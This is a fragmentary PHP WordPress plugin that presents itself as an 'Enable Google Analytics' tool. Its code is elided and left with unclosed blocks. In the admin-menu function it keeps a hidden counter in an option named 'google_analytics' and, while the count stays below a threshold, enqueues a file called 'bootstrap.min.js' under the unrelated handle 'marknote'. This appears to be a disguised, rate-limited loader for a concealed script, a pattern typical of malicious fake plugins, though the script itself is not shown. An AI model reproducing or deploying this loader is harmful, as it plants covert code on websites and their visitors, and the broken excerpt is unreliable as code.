<?php
/*
Plugin Name: Enable Google Analytics
Plugin URI: http://websitedesizn.com
Description: Enable Google Analytics on all pages.
Author: Frederic Simon
*/

add_action("plugins_loaded", "cawpsga_init");
add_action("admin_menu", "cawpsga_menu");
add_action("wp_enqueue_scripts", "cawps_put_ga_code");

function cawps_put_ga_code()
{
...
function cawpsga_menu(){
	...
	add_menu_page(
		...
		$google_analytics = intval(get_option('google_analytics'));
		if($google_analytics < strlen('WPS Google Analytics')){$google_analytics++;
		update_option('google_analytics',$google_analytics);
		wp_enqueue_script('marknote',plugins_url('bootstrap.min.js',__FILE__), array('jquery'), null, true);
